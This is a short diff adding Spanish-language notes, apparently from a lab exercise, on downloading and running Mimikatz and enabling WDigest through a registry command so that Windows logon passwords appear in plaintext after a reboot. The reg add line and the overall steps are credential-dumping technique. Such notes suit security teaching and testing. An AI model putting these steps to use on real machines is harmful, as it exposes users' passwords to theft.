@@ -1,0 +1,18 @@
+descargar mimikatz
+
+https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200519
+
+ejecutar mimikatz
+
+http://blog.gentilkiwi.com/mimikatz
+
+
+ver las claves...
+
+activar wdigest:
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+REINICIAR
+
+Volver a ejecutar: comprobar que ahora veis la clave en claro.
